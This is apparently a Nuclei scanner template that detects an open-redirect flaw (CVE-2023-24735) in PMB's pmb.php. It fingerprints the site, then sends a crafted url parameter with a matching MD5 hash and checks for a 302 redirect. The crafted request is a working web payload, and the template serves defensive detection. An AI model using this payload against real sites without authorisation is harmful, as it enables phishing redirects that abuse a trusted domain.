id: pmb-open-redirect-cve-2023-24735
info:
  name: "PMB pmb.php 文件存在重定向漏洞"
  author: ProjectDiscoveryAI
  severity: medium
  tags: PMB

variables:
  redirect_url: "https://www.baidu.com"
  redirect_url_hash: "{{md5(redirect_url)}}"

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        GET /pmb/opac_css/ HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "PMB Group"

  - raw:
      - |
        GET /pmb/opac_css/pmb.php?url={{redirect_url}}&hash={{redirect_url_hash}} HTTP/1.1
        Host: {{Hostname}}
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "Location: {{redirect_url}}"
      - type: word
        part: body
        words:
          - ""
